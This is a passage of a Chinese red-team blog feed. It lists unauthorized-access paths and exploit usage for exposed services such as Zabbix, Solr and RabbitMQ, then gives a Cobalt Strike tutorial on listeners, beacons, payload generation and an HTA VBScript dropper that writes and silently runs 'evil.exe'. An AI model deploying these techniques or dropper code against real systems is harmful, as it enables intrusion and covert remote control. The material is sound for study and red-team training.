href="#Zabbix-10051" class="headerlink" title="Zabbix-10051"></a>Zabbix-10051</h3><blockquote><p>zabbixæ˜¯ä¸€æ¬¾æœåŠ¡å™¨ç›‘æ§è½¯ä»¶ï¼Œé»˜è®¤æœåŠ¡å¼€æ”¾ç«¯å£ä¸º10051ï¼Œå…¶ç”±serverã€agentã€webç­‰æ¨¡å—ç»„æˆï¼Œå…¶ä¸­<strong>webæ¨¡å—ç”±PHPç¼–å†™</strong>ï¼Œç”¨æ¥æ˜¾ç¤ºæ•°æ®åº“ä¸­çš„ç»“æœã€‚</p></blockquote><p><a href="https://paper.seebug.org/1697/#zabbix-agent">Zabbix æ”»å‡»é¢æŒ–æ˜ä¸åˆ©ç”¨ (seebug.org)</a></p><p>æœªæˆæƒè®¿é—®</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/zabbix.php?action=problem.view&amp;ddreset=1</span><br><span class="line">/overview.php?ddreset=1</span><br><span class="line">/srv_status.php?ddreset=1</span><br><span class="line">/latest.php?ddreset=1</span><br></pre></td></tr></table></figure><p><a href="https://github.com/BaizeSec/bylibrary/tree/main/docs/%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/zabbix">bylibrary&#x2F;docs&#x2F;æ¼æ´åº“&#x2F;01-CMSæ¼æ´&#x2F;zabbix at main Â· BaizeSec&#x2F;bylibrary (github.com)</a></p><ul><li>sqlæ³¨å…¥</li><li>åå°åˆ›å»ºè„šæœ¬getshell</li></ul><p><a href="https://www.secpulse.com/archives/179601.html">CVE-2022-23131ï¼šZabbix SSOè®¤è¯ç»•è¿‡æ¼æ´ - SecPulse.COM | å®‰å…¨è„‰æ</a></p><p><a href="https://xz.aliyun.com/t/8991">CVE-2020-11800 zabbix RCEæ¼æ´ç»†èŠ‚æŠ«éœ² - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><ul><li><p>è¿›å…¥åå°å¯è‡ªåŠ¨æ³¨å†ŒåŠŸèƒ½</p></li><li><p>expè·å–serverç«¯ï¼ˆexpéœ€è¦åœ¨zabbixæ‰€åœ¨çš„æœåŠ¡å™¨ä¸Šè¿è¡Œï¼‰</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python exp.py 127.0.0.1 cmd</span><br></pre></td></tr></table></figure></li></ul><h3 id="å®å¡”-8888"><a href="#å®å¡”-8888" class="headerlink" title="å®å¡”-8888"></a>å®å¡”-8888</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/pma</span><br></pre></td></tr></table></figure><h3 id="Solr-8983"><a href="#Solr-8983" class="headerlink" title="Solr-8983"></a>Solr-8983</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/solr/admin</span><br></pre></td></tr></table></figure><p><a href="https://cloud.tencent.com/developer/article/1812009">Apache Solr &lt;&#x3D; 8.8.1ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´å¤ç°-è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘ (tencent.com)</a></p><h3 id="Docker-Remote-API-2375"><a href="#Docker-Remote-API-2375" class="headerlink" title="Docker-Remote-API-2375"></a>Docker-Remote-API-2375</h3><p><a href="https://wiki.teamssix.com/cloudnative/docker/docker-remote-api-unauth-escape.html">Docker è¿œç¨‹ API æœªæˆæƒè®¿é—®é€ƒé€¸ | T Wiki (teamssix.com)</a></p><h3 id="Docker-Registry-5000"><a href="#Docker-Registry-5000" class="headerlink" title="Docker Registry-5000"></a>Docker Registry-5000</h3><h3 id="RabbitMQ-15672ã€15692ã€25672"><a href="#RabbitMQ-15672ã€15692ã€25672" class="headerlink" title="RabbitMQ-15672ã€15692ã€25672"></a>RabbitMQ-15672ã€15692ã€25672</h3><p>å¼±å£ä»¤guset&#x2F;guest</p><h2 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h2><h3 id="RDP-3389"><a href="#RDP-3389" class="headerlink" title="RDP-3389"></a>RDP-3389</h3>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Cobal Strikeä½¿ç”¨</title>
      <link href="/2023/07/11/Cobal%20Strike%E4%BD%BF%E7%94%A8/"/>
      <url>/2023/07/11/Cobal%20Strike%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="C2æ˜¯ä»€ä¹ˆ"><a href="#C2æ˜¯ä»€ä¹ˆ" class="headerlink" title="C2æ˜¯ä»€ä¹ˆ"></a>C2æ˜¯ä»€ä¹ˆ</h1><p>C2 ä¸ºCommand &amp; Controlçš„ç®€ç§°ï¼Œ å³å‘½ä»¤åŠæ§åˆ¶æœåŠ¡å™¨ã€‚</p><p>ä»è¯­ä¹‰ä¸Šæ¥è®²ï¼ŒC2å³å¯ç”¨ä½œä¸ºåè¯ï¼ˆåŸºç¡€è®¾æ–½ï¼‰ä¹Ÿå¯ä»¥ä½œä¸ºåŠ¨è¯ï¼ˆäº¤äº’çš„è¡Œä¸ºï¼‰ï¼Œä¾‹å¦‚C2æœåŠ¡å™¨ï¼ˆåè¯åšå®šè¯­ï¼‰ã€æ”»å‡»è€…è¿›è¡ŒC2ã€‚</p><p>C2 é€šå¸¸æœ‰ä¸‰ä¸ªè§’è‰²ï¼Œå®¢æˆ·ç«¯ã€è¢«æ§ç«¯ã€æœåŠ¡ç«¯ã€‚å®¢æˆ·ç«¯é€šè¿‡è¿æ¥åˆ°æœåŠ¡ç«¯æœåŠ¡ç«¯æ“æ§å—å®³è€…ç»ˆç«¯ã€‚</p><p><img src="/../images/3507266222.png" alt="C2 è¿æ¥å›¾.png"></p><p>æ›´å¤šå†…å®¹é˜…è¯»<a href="https://www.cnblogs.com/Hekeats-L/p/17346694.html">ã€THMã€‘Intro to C2(C2ç®€ä»‹)-çº¢é˜Ÿ - Hekeats - åšå®¢å›­ (cnblogs.com)</a></p><h1 id="Cobal-Strikeæ˜¯ä»€ä¹ˆ"><a href="#Cobal-Strikeæ˜¯ä»€ä¹ˆ" class="headerlink" title="Cobal Strikeæ˜¯ä»€ä¹ˆ"></a>Cobal Strikeæ˜¯ä»€ä¹ˆ</h1><p>CobaltStrikeå°±æ˜¯ä¸€æ¬¾æµè¡Œçš„C2æ¡†æ¶</p><p>å…¶é›†æˆäº†ç«¯å£è½¬å‘ã€æ‰«æå¤šæ¨¡å¼ç«¯å£Listenerã€Windows exeç¨‹åºç”Ÿæˆã€Windows dllåŠ¨æ€é“¾æ¥åº“ç”Ÿæˆã€javaç¨‹åºç”Ÿæˆã€officeå®ä»£ç ç”Ÿæˆï¼ŒåŒ…æ‹¬ç«™ç‚¹å…‹éš†è·å–æµè§ˆå™¨çš„ç›¸å…³ä¿¡æ¯ç­‰ã€‚</p><p>æ—©æœŸç‰ˆæœ¬Cobalt Srtikeä¾èµ–Metasploitæ¡†æ¶ï¼Œè€Œç°åœ¨Cobalt Strikeå·²ç»ä¸å†ä½¿ç”¨MSFè€Œæ˜¯ä½œä¸ºå•ç‹¬çš„å¹³å°ä½¿ç”¨ã€‚</p><p>è¿™ä¸ªå·¥å…·çš„ç¤¾åŒºç‰ˆæ˜¯å¤§å®¶ç†ŸçŸ¥çš„Armitage(ä¸€ä¸ªMSFçš„å›¾å½¢åŒ–ç•Œé¢å·¥å…·)ï¼Œè€ŒCobalt Strikeå¤§å®¶å¯ä»¥ç†è§£å…¶ä¸ºArmitageçš„å•†ä¸šç‰ˆã€‚</p><h1 id="åŸºç¡€æ“ä½œ"><a href="#åŸºç¡€æ“ä½œ" class="headerlink" title="åŸºç¡€æ“ä½œ"></a>åŸºç¡€æ“ä½œ</h1><h2 id="ç®€å•ä½¿ç”¨"><a href="#ç®€å•ä½¿ç”¨" class="headerlink" title="ç®€å•ä½¿ç”¨"></a>ç®€å•ä½¿ç”¨</h2><ul><li><p>å¼€å¯æœåŠ¡ç«¯</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./teamserver æœåŠ¡ç«¯ip å¯†ç  [config_file]</span><br></pre></td></tr></table></figure></li><li><p>å®¢æˆ·ç«¯è¿æ¥æœåŠ¡ç«¯</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./cobaltstrike</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230701175701242.png" alt="image-20230701175701242"></p></li><li><p>å—å®³æœºä¸Šçº¿</p><ul><li><p>åˆ›å»ºlistener</p><p><img src="/../images/image-20230701175934933.png" alt="image-20230701175934933"></p><p><img src="/../images/image-20230701175948195.png" alt="image-20230701175948195"></p><p>hostå’Œbeaconsè®¾ç½®ä¸ºæœåŠ¡ç«¯ipåœ°å€ï¼ˆæœåŠ¡ç«¯è¿æ¥ç›®æ ‡ï¼Œå®¢æˆ·ç«¯è¿æ¥åˆ°æœåŠ¡ç«¯ï¼‰</p></li><li><p>åˆ›å»ºpayload&#x2F;æœ¨é©¬</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># powershell</span></span><br><span class="line">ç‚¹å‡»Attacks â†’ Web Drive-by â†’ Scripted Web Delivery</span><br></pre></td></tr></table></figure><p>å—å®³æœºä½¿ç”¨powershellæ‰§è¡Œç”Ÿæˆçš„payloadå³å¯ä¸Šçº¿</p></li></ul></li><li><p>ä¸Šçº¿åæ“ä½œ</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å­¦ä¹ æ—¶å°†å¿ƒè·³è®¾ä¸º0</span></span><br><span class="line"><span class="built_in">sleep</span> 0</span><br></pre></td></tr></table></figure></li></ul><h2 id="èœå•æ Cobal-Strike"><a href="#èœå•æ Cobal-Strike" class="headerlink" title="èœå•æ Cobal Strike"></a>èœå•æ Cobal Strike</h2><p><img src="/../images/image-20231011221738583.png" alt="image-20231011221738583"></p><p>è„šæœ¬ç®¡ç†å™¨â†’å¯¼å…¥CSæ’ä»¶</p><h2 id="èœå•æ Viewsï¼ˆè§†å›¾ï¼‰"><a href="#èœå•æ Viewsï¼ˆè§†å›¾ï¼‰" class="headerlink" title="èœå•æ Viewsï¼ˆè§†å›¾ï¼‰"></a>èœå•æ Viewsï¼ˆè§†å›¾ï¼‰</h2><p><img src="/../images/image-20231011220312223.png" alt="image-20231011220312223"></p><h2 id="èœå•æ Reportingï¼ˆæŠ¥å‘Šï¼‰"><a href="#èœå•æ Reportingï¼ˆæŠ¥å‘Šï¼‰" class="headerlink" title="èœå•æ Reportingï¼ˆæŠ¥å‘Šï¼‰"></a>èœå•æ Reportingï¼ˆæŠ¥å‘Šï¼‰</h2><p>Cobalt Strikeç”ŸæˆæŠ¥å‘Šçš„ç›®çš„åœ¨äºåŸ¹è®­æˆ–å¸®åŠ©è“é˜Ÿï¼ˆæ„Ÿè§‰æˆ‘ä¹Ÿå¯ä»¥ç”¨è¿™ä¸ªæ¥å­¦ä¹ æ‰‹æ³•ï¼‰</p><p><img src="/../images/image-20231011221035175.png" alt="image-20231011221035175"></p><ul><li>æ´»åŠ¨æŠ¥å‘Šï¼ˆActivity Reportï¼‰<br>æ­¤æŠ¥å‘Šä¸­æä¾›äº†çº¢é˜Ÿæ´»åŠ¨çš„æ—¶é—´è¡¨ï¼Œè®°å½•äº†æ¯ä¸ªåæ¸—é€æ´»åŠ¨ã€‚</li><li>ä¸»æœºæŠ¥å‘Šï¼ˆHosts Reportï¼‰<br>æ­¤æŠ¥å‘Šä¸­æ±‡æ€»äº†Cobalt Strikeæ”¶é›†çš„ä¸»æœºä¿¡æ¯ï¼Œå‡­æ®ã€æœåŠ¡å’Œä¼šè¯ä¹Ÿä¼šåœ¨æ­¤æŠ¥å‘Šä¸­ã€‚</li><li>ä¾µå®³æŒ‡æ ‡æŠ¥å‘Šï¼ˆIndicators of Compromiseï¼‰<br>æ­¤æŠ¥å‘Šä¸­åŒ…æ‹¬å¯¹C2æ‹“å±•æ–‡ä»¶çš„åˆ†æã€ä½¿ç”¨çš„åŸŸååŠä¸Šä¼ æ–‡ä»¶çš„MD5å“ˆå¸Œã€‚</li><li>ä¼šè¯æŠ¥å‘Šï¼ˆSessions Reportï¼‰<br>æ­¤æŠ¥å‘Šä¸­è®°å½•äº†æŒ‡æ ‡å’Œæ´»åŠ¨ï¼ŒåŒ…æ‹¬æ¯ä¸ªä¼šè¯å›è¿åˆ°è‡ªå·±çš„é€šä¿¡è·¯å¾„ã€åæ¸—é€æ´»åŠ¨çš„æ—¶é—´çº¿ç­‰ã€‚</li><li>ç¤¾å·¥æŠ¥å‘Šï¼ˆSocial Engineering Reportï¼‰<br>æ­¤æŠ¥å‘Šä¸­è®°å½•äº†æ¯ä¸€è½®ç½‘ç»œé’“é±¼çš„ç”µå­é‚®ä»¶ã€è°ç‚¹å‡»ä»¥åŠä»æ¯ä¸ªç‚¹å‡»ç”¨æˆ·é‚£é‡Œæ”¶é›†çš„ä¿¡æ¯ã€‚è¯¥æŠ¥å‘Šè¿˜æ˜¾ç¤ºäº†Cobalt Strikeçš„System profilerå‘ç°çš„åº”ç”¨ç¨‹åºã€‚</li><li>æˆ˜æœ¯ã€æŠ€å·§å’Œç¨‹åºæŠ¥å‘Šï¼ˆTactics,Techniques,and Proceduresï¼‰<br>æ­¤æŠ¥å‘Šå°†è‡ªå·±çš„Cobalt Strikeè¡ŒåŠ¨æ˜ å°„åˆ°MITREçš„ATT&amp;CKçŸ©é˜µä¸­çš„æˆ˜æœ¯ï¼Œå…·ä½“å¯å‚è€ƒ<a href="https://attack.mitre.org/">https://attack.mitre.org/</a></li></ul><h2 id="å¯¼èˆªæ "><a href="#å¯¼èˆªæ " class="headerlink" title="å¯¼èˆªæ "></a>å¯¼èˆªæ </h2><p><img src="/../images/image-20231011204333463.png" alt="image-20231011204333463"></p><p>æœåŠ¡å™¨èŠ‚ç‚¹å›¾</p><p><img src="/../images/image-20231011220105230.png" alt="image-20231011220105230"></p><blockquote><p>æ¯ä¸ªä¸»æœºçš„å›¾æ ‡æ ‡è¯†äº†å®ƒçš„æ“ä½œç³»ç»Ÿã€‚å¦‚æœå›¾æ ‡æ˜¯çº¢è‰²çš„ã€å¹¶ä¸”å¸¦æœ‰é—ªç”µï¼Œé‚£ä¹ˆè¡¨ç¤ºæ­¤ Beacon è¿è¡Œåœ¨ç®¡ç†å‘˜æƒé™çš„è¿›ç¨‹ä¸­ã€‚ä¸€ä¸ªè¤ªè‰²çš„å›¾æ ‡è¯´æ˜æ­¤ Beacon ä¼šè¯è¢«è¦æ±‚ç¦»å¼€å¹¶ä¸”å®ƒæ¥å—äº†æ­¤ å‘½ä»¤ã€‚ é˜²ç«å¢™å›¾æ ‡ä»£è¡¨ä½  Beacon payload çš„æµé‡å‡ºå£ç‚¹ã€‚ç»¿è‰²è™šçº¿è¡¨ç¤ºä½¿ç”¨äº† HTTP æˆ– HTTPS è¿æ¥å‡ºç½‘ã€‚ é»„è‰²è™šçº¿è¡¨ç¤ºä½¿ç”¨ DNS åè®®å‡ºç½‘ã€‚</p><p>ä»ä¸€ä¸ª Beacon ä¼šè¯è¿æ¥åˆ°å¦ä¸€ä¸ª Beacon ä¼šè¯çš„ç®­å¤´è¡¨ç¤ºä¸¤ä¸ª Beacon ä¹‹é—´å­˜åœ¨è¿æ¥ã€‚åœ¨è¿™ç§å¯¹ç­‰é€š ä¿¡æ¨¡å¼ä¸­ï¼ŒCobalt Strike çš„ Beacon ä½¿ç”¨ Windows å‘½åç®¡é“å’Œ TCP sockets æ¥æ§åˆ¶å…¶ä»–çš„Beaconã€‚ æ©™é»„è‰²çš„ç®­å¤´ä»£è¡¨å‘½åç®¡é“é€šé“ã€‚SSH ä¼šè¯ä¹Ÿä½¿ç”¨ä¸€ä¸ªæ©™é»„è‰²çš„ç®­å¤´ã€‚ä¸€ä¸ªæ¹–è“è‰²çš„ç®­å¤´ä»£è¡¨ä¸€ä¸ª TCP socket é€šé“ã€‚ä¸€ä¸ªçº¢è‰²çš„ï¼ˆå‘½åç®¡é“ï¼‰æˆ–ç´«è‰²çš„ï¼ˆTCPï¼‰ç®­å¤´è¡¨ç¤ºä¸€ä¸ª Beacon è¿æ¥æ–­æ‰äº†ã€‚</p></blockquote><h1 id="åŸºç¡€è®¾æ–½"><a href="#åŸºç¡€è®¾æ–½" class="headerlink" title="åŸºç¡€è®¾æ–½"></a>åŸºç¡€è®¾æ–½</h1><p><strong>ä¸ºä»€ä¹ˆè¦æ­å»ºåŸºç¡€è®¾æ–½</strong></p><blockquote><p>éšè”½</p></blockquote><h2 id="ç›‘å¬å™¨Listeners"><a href="#ç›‘å¬å™¨Listeners" class="headerlink" title="ç›‘å¬å™¨Listeners"></a>ç›‘å¬å™¨Listeners</h2><p><strong>ä»€ä¹ˆæ˜¯ç›‘å¬å™¨</strong></p><p>é¡¾åæ€ä¹‰ï¼Œç›‘å¬å™¨å°±æ˜¯ç­‰å¾…è¢«å…¥ä¾µç³»ç»Ÿè¿æ¥è‡ªå·±çš„ä¸€ä¸ªæœåŠ¡ã€‚</p><p><strong>ç›‘å¬å™¨çš„ä½œç”¨</strong></p><p>ä¸»è¦æ˜¯ä¸ºäº†æ¥å—payloadå›ä¼ çš„å„ç±»æ•°æ®ï¼Œç±»ä¼¼äºMSFä¸­handlerçš„ä½œç”¨ã€‚</p><p>æ¯”å¦‚payloadåœ¨ç›®æ ‡æœºå™¨æ‰§è¡Œä»¥åï¼Œå°±ä¼šå›è¿åˆ°ç›‘å¬å™¨ç„¶åä¸‹è½½æ‰§è¡ŒçœŸæ­£çš„shellcodeä»£ç ã€‚</p><p><strong>ç›‘å¬å™¨çš„åå­—ä¸€èˆ¬ç”±ä»¥ä¸‹ç»“æ„ç»„æˆï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Operating System/Payload/Stager</span><br></pre></td></tr></table></figure><p>ä¾‹å¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">windows/beacon_http/reverse_http</span><br></pre></td></tr></table></figure><p><strong>ä»€ä¹ˆæ˜¯ä¼ è¾“å™¨</strong></p><p>æ”»å‡»è½½è·<code>payload</code>å°±æ˜¯æ”»å‡»æ‰§è¡Œçš„å†…å®¹ã€‚æ”»å‡»è½½è·é€šå¸¸è¢«åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼šä¼ è¾“å™¨<code>stager</code> å’Œä¼ è¾“ä½“<code>stage</code>ã€‚</p><p>ä¼ è¾“å™¨<code>stager</code>æ˜¯ä¸€ä¸ªå°ç¨‹åºï¼Œç”¨äºè¿æ¥ã€ä¸‹è½½ä¼ è¾“ä½“<code>stage</code>ï¼Œå¹¶æ’å…¥åˆ°å†…å­˜ä¸­ã€‚</p><p>æˆ‘ä¸ªäººç†è§£ä¸ºï¼šæ”»å‡»è½½è·é‡ŒçœŸæ­£ç”¨äºæ”»å‡»çš„ä»£ç æ˜¯åœ¨ä¼ è¾“ä½“é‡Œã€‚</p><p>æ‰€ä»¥ä¸ºä»€ä¹ˆè¦æœ‰ä¼ è¾“ä½“ï¼Ÿç›´æ¥æŠŠæ”»å‡»è½½è·æ’å…¥åˆ°å†…å­˜ä¸­ä¸æ›´æ–¹ä¾¿å¿«æ·ã€æ›´é¦™ä¹ˆï¼Œæå¾—åˆæ˜¯ä¼ è¾“å™¨åˆæ˜¯ä¼ è¾“ä½“çš„ã€‚</p><p>éœ€è¦ä¼ è¾“ä½“æ˜¯å› ä¸ºåœ¨å¾ˆå¤šæ”»å‡»ä¸­å¯¹äºèƒ½åŠ è½½è¿›å†…å­˜ï¼Œå¹¶åœ¨æˆåŠŸæ¼æ´åˆ©ç”¨åæ‰§è¡Œçš„æ•°æ®å¤§å°å­˜åœ¨ä¸¥æ ¼é™åˆ¶ã€‚è¿™å°±å¯¼è‡´åœ¨æ”»å‡»æˆåŠŸæ—¶ï¼Œå¾ˆéš¾åµŒå…¥é¢å¤–çš„æ”»å‡»è½½è·ï¼Œæ­£æ˜¯å› ä¸ºè¿™äº›é™åˆ¶ï¼Œæ‰ä½¿å¾—ä¼ è¾“å™¨å˜å¾—æœ‰å¿…è¦äº†ã€‚</p><p><strong>åˆ›å»ºç›‘å¬å™¨</strong></p><p><img src="/../images/image-20231011211109107.png" alt="image-20231011211109107"></p><ul><li><p>Name æ˜¯å¯¹ Listener å¤‡æ³¨åç§°</p></li><li><p>Payloadä¸­å¯ä»¥é€‰æ‹©ç›‘å¬å™¨çš„ç±»å‹å’Œä½¿ç”¨çš„åè®®</p><ul><li><p>Beacon</p><p>Beaconç›´è¯‘è¿‡æ¥å°±æ˜¯ç¯å¡”ã€ä¿¡æ ‡ã€ç…§äº®æŒ‡å¼•çš„æ„æ€</p><p>Beaconç›‘å¬å™¨çš„åç§°<code>windows/beacon_http/reverse_http</code>â†’ <code>System/Payload/Stager</code></p></li><li><p>Foreign</p><p>Foreignç›´è¯‘å°±æ˜¯å¤–éƒ¨çš„ï¼Œè¿™é‡Œå¯ä»¥ç†è§£æˆ<code>å¯¹å¤–ç›‘å¬å™¨</code>ï¼Œä¸»è¦ç”¨äºæ´¾ç”Ÿä¼šè¯ï¼Œå¦‚å°†ä¼šè¯æ´¾ç”Ÿåˆ°MSFä¸­</p></li></ul></li><li><p>HTTP Hosts æ˜¯ Beacon å›è¿åœ°å€</p></li><li><p>HTTP Port (C2) æ˜¯å›è¿åœ°å€ç«¯å£å·</p></li><li><p>HTTP Host (Stager) æ˜¯ä¸‹è½½ Staged å‰©ä½™ Payload ä¸»æœºåœ°å€ã€‚</p></li></ul><h2 id="Beacon"><a href="#Beacon" class="headerlink" title="Beacon"></a>Beacon</h2><h3 id="Beaconæ˜¯ä»€ä¹ˆ"><a href="#Beaconæ˜¯ä»€ä¹ˆ" class="headerlink" title="Beaconæ˜¯ä»€ä¹ˆ"></a><strong>Beaconæ˜¯ä»€ä¹ˆ</strong></h3><ul><li><p>Beacon(ä¿¡æ ‡)æ˜¯æŒ‡C2ä»£ç†å›è°ƒåœ¨C2æœåŠ¡å™¨ä¸Šè¿è¡Œçš„ä¾¦å¬å™¨çš„è¿‡ç¨‹ï¼Œå®ƒæ˜¯ä¸€ç§æ¶æ„è½¯ä»¶ä¸C2(å‘½ä»¤ä¸æ§åˆ¶)æœåŠ¡å™¨ä¹‹é—´çš„å®šæœŸé€šä¿¡æ–¹å¼(é€šä¿¡æœºåˆ¶)ã€‚</p></li><li><p>Beaconæœ‰ä¸¤ç§é€šä¿¡æ¨¡å¼ã€‚</p><p>ä¸€ç§æ˜¯å¼‚æ­¥é€šä¿¡æ¨¡å¼ï¼Œè¿™ç§æ¨¡å¼é€šä¿¡æ•ˆç‡ç¼“æ…¢ï¼ŒBeaconå›è¿å›¢é˜ŸæœåŠ¡å™¨ã€ä¸‹è½½ä»»åŠ¡ã€ç„¶åä¼‘çœ ï¼›</p><blockquote><p>ä¸ºäº†é¿å…é¢‘ç¹é€šä¿¡æš´éœ²ç›®æ ‡ï¼Œæ¯ä¸ª Beacon é»˜è®¤ sleep æ˜¯ 60 ç§’ä¸æœåŠ¡å™¨é€šè®¯ä¸€æ¬¡ï¼Œå¯ä»¥é€šè¿‡å‘½ä»¤ sleep æˆ–è€…å³é”® Becaonï¼Œæ‰¾åˆ° <code>Session -&gt; Sleep</code> è®¾ç½® TeamServer ä¸ Beacon é€šä¿¡æ—¶é—´ã€‚</p></blockquote><p>å¦ä¸€ç§æ˜¯äº¤äº’å¼é€šä¿¡æ¨¡å¼ï¼Œè¿™ç§æ¨¡å¼çš„é€šä¿¡æ˜¯å®æ—¶å‘ç”Ÿçš„ã€‚</p><blockquote><p>å°†sleepè®¾ç½®ä¸º0</p></blockquote></li></ul><h3 id="Beaconçš„ç±»å‹â€“å¾…å­¦ä¹ "><a href="#Beaconçš„ç±»å‹â€“å¾…å­¦ä¹ " class="headerlink" title="Beaconçš„ç±»å‹â€“å¾…å­¦ä¹ "></a><strong>Beaconçš„ç±»å‹</strong>â€“å¾…å­¦ä¹ </h3><ul><li>Beacon DNS</li><li>Beacon HTTP</li><li>Beacon HTTPS</li><li>Beacon SMB</li><li>Beacon TCP</li><li>Extermal C2</li></ul><h2 id="profileæµé‡æ··æ·†"><a href="#profileæµé‡æ··æ·†" class="headerlink" title="profileæµé‡æ··æ·†"></a>profileæµé‡æ··æ·†</h2><p>Cobalt Strikeçš„ Malleable-C2-Profilesé…ç½®æ–‡ä»¶æ˜¯ç”¨æ¥ä¼ªè£…æµé‡å’Œä¿®æ”¹æµé‡ç‰¹å¾çš„ï¼Œ<strong>ç›®çš„æ˜¯è®©é€šè®¯æ›´åŠ éšè”½åŒæ—¶è¿˜å¯ä»¥æ§åˆ¶Beaconçš„ä¸€äº›é»˜è®¤è¡Œä¸ºã€‚</strong></p><h1 id="Attacksï¼ˆæ”»å‡»ï¼‰"><a href="#Attacksï¼ˆæ”»å‡»ï¼‰" class="headerlink" title="Attacksï¼ˆæ”»å‡»ï¼‰"></a>Attacksï¼ˆæ”»å‡»ï¼‰</h1><h2 id="Packagesï¼ˆç”Ÿæˆæœ¨é©¬ï¼‰"><a href="#Packagesï¼ˆç”Ÿæˆæœ¨é©¬ï¼‰" class="headerlink" title="Packagesï¼ˆç”Ÿæˆæœ¨é©¬ï¼‰"></a>Packagesï¼ˆç”Ÿæˆæœ¨é©¬ï¼‰</h2><h3 id="HTML-Application-Attackï¼ˆHTA-Attackï¼‰"><a href="#HTML-Application-Attackï¼ˆHTA-Attackï¼‰" class="headerlink" title="HTML Application Attackï¼ˆHTA Attackï¼‰"></a>HTML Application Attackï¼ˆHTA Attackï¼‰</h3><blockquote><p>HTAæ–‡ä»¶æ˜¯ä¸€ç§ç§°ä¸ºHTMLåº”ç”¨ç¨‹åºçš„æ–‡ä»¶æ ¼å¼ï¼Œå®ƒæ˜¯åŸºäº HTMLã€CSSã€VBScriptçš„æŠ€æœ¯ã€‚</p><p>HTAæ–‡ä»¶å¯ä»¥åœ¨Windowsæ“ä½œç³»ç»Ÿä¸Šè¿è¡Œï¼Œé€šè¿‡åŒå‡»HTAæ–‡ä»¶æˆ–ä½¿ç”¨å‘½ä»¤è¡Œè¿è¡Œmshta.exeæ¥å¯åŠ¨ã€‚</p><p>å…¶ä¸­HTML å’Œ CSS æ§åˆ¶æ ·å¼ï¼Œè€ŒVBScriptå¯ä»¥ç”¨æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</p></blockquote><p><strong>Demoä»£ç </strong></p><figure class="highlight vbscript"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;tetsa&lt;/title&gt;</span><br><span class="line">        &lt;style&gt;</span><br><span class="line">            h1 &#123;</span><br><span class="line">                color: red;</span><br><span class="line">            &#125;</span><br><span class="line">        &lt;/style&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;h1&gt;Hello&lt;/h1&gt;</span><br><span class="line">        &lt;a href=#&gt;test link&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">        &lt;script language=<span class="string">&quot;VBScript&quot;</span>&gt;</span><br><span class="line">            <span class="built_in">CreateObject</span>(<span class="string">&quot;Wscript.Shell&quot;</span>).Run(<span class="string">&quot;calc&quot;</span>)</span><br><span class="line">        &lt;/script&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>åŒå‡»æ‰“å¼€å°±ä¼šæ‰§è¡Œvbsä»£ç ï¼Œä»è€Œå¼¹å‡ºè®¡ç®—å™¨</p><p><img src="/../images/image-20231011223006570.png" alt="image-20231011223006570"></p><p>HTML Application èœå•æœ‰ä¸‰ä¸ªæ–¹æ³•ï¼š</p><p><img src="/../images/image-20231011222135501.png" alt="image-20231011222135501"></p><ul><li>Executable</li><li>PowerShell</li><li>VBA</li></ul><p>Executable ç”Ÿæˆå†…å®¹æ˜¯ VBScript è„šæœ¬ï¼Œä½¿ç”¨ Wscript.Shell è¿è¡Œä»£ç ã€‚</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;VBScript&quot;</span>&gt;</span></span><br><span class="line">    Function var_func()</span><br><span class="line">        var_shellcode = &quot;4d5a90000300000004000000ffff0000b8000......&quot;</span><br><span class="line"></span><br><span class="line">        Dim var_obj</span><br><span class="line">        Set var_obj = CreateObject(&quot;Scripting.FileSystemObject&quot;)</span><br><span class="line">        Dim var_stream</span><br><span class="line">        Dim var_tempdir</span><br><span class="line">        Dim var_tempexe</span><br><span class="line">        Dim var_basedir</span><br><span class="line">        Set var_tempdir = var_obj.GetSpecialFolder(2)</span><br><span class="line">        var_basedir = var_tempdir &amp; &quot;\&quot; &amp; var_obj.GetTempName()</span><br><span class="line">        var_obj.CreateFolder(var_basedir)</span><br><span class="line">        var_tempexe = var_basedir &amp; &quot;\&quot; &amp; &quot;evil.exe&quot;</span><br><span class="line">        Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)</span><br><span class="line">        For i = 1 to Len(var_shellcode) Step 2</span><br><span class="line">            var_stream.Write Chr(CLng(&quot;&amp;H&quot; &amp; Mid(var_shellcode,i,2)))</span><br><span class="line">        Next</span><br><span class="line">        var_stream.Close</span><br><span class="line">        Dim var_shell</span><br><span class="line">        Set var_shell = CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line">        var_shell.run var_tempexe, 0, true</span><br><span class="line">        var_obj.DeleteFile(var_tempexe)</span><br><span class="line">        